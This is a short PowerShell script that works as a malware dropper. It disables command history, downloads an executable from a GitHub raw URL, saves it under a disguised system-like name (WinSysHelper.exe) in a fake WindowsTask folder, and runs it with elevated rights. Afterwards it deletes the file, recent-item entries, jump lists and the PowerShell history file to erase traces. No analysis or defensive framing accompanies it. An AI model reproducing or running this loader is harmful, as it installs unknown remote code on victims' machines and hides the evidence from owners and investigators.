Set-PSReadlineOption -HistorySaveStyle SaveNothing

$ProgressPreference = 'SilentlyContinue'
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$folder = "C:\ProgramData\WindowsTask"
$output = "$folder\WinSysHelper.exe"

if (-not (Test-Path $folder)) { New-Item -Path $folder -ItemType Directory | Out-Null }

Invoke-WebRequest -Uri $url -OutFile $output
$process = Start-Process -FilePath $output -Verb RunAs -PassThru
$process | Wait-Process

Start-Sleep -Seconds 2

if (Test-Path $output) {
    Remove-Item -Path $output -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
}

$recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
Remove-Item -Path "$recentPath\WinSysHelper*" -Force -ErrorAction SilentlyContinue
$jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
Get-ChildItem -Path $jumpListPath | Remove-Item -Force -ErrorAction SilentlyContinue

Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

exit
